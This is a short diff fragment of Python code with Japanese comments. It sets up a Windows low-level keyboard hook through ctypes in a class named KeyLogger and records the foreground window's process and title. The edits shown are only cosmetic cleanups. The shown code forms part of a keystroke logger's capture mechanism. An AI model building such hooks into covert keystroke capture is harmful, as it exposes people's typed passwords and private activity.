@@ -359,8 +359,8 @@ import ctypes
 from ctypes import *
 from ctypes.wintypes import DWORD
 
-user32 = windll.user32#CDLL("user32.dll")#
-kernel32 = windll.kernel32#CDLL("kernel32.dll")#
+user32 = windll.user32
+kernel32 = windll.kernel32
 
 
 class KBDLLHOOKSTRUCT( Structure ):
@@ -377,7 +377,7 @@ HOOKPROC = WINFUNCTYPE( HRESULT, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.wi
 
 SetWindowsHookEx = ctypes.windll.user32.SetWindowsHookExA
 SetWindowsHookEx.restype = ctypes.wintypes.HHOOK
-SetWindowsHookEx.argtypes = [c_int, HOOKPROC, ctypes.wintypes.HINSTANCE, ctypes.wintypes.DWORD]
+SetWindowsHookEx.argtypes = [ c_int, HOOKPROC, ctypes.wintypes.HINSTANCE, ctypes.wintypes.DWORD ]
 
 
 
@@ -393,7 +393,7 @@ class KeyLogger:
         # hinstの入力に注意. https://stackoverflow.com/questions/49898751/setwindowshookex-gives-error-126-module-not-found-when
         # 明示的にやらないと126(module not found)が発生して関数フックできない
         hinst = ctypes.windll.LoadLibrary('user32')._handle
-        #hinst = kernel32.GetModuleHandleW( None )._handle
+        #hinst = kernel32.GetModuleHandleW( None )
 
         self.hooked = SetWindowsHookEx(#self.lUser32.SetWindowsHookExA(
             win32con.WH_KEYBOARD_LL,
@@ -470,7 +470,7 @@ def HookProc( nCode, wParam, lParam ):
     hwnd = ctypes.windll.user32.GetForegroundWindow()
 
     # get process id
-    pid = ctypes.wintypes.DWORD()    
+    pid = ctypes.wintypes.DWORD()
     tid = ctypes.windll.user32.GetWindowThreadProcessId( hwnd, ctypes.byref(pid) )
 
     # get window title
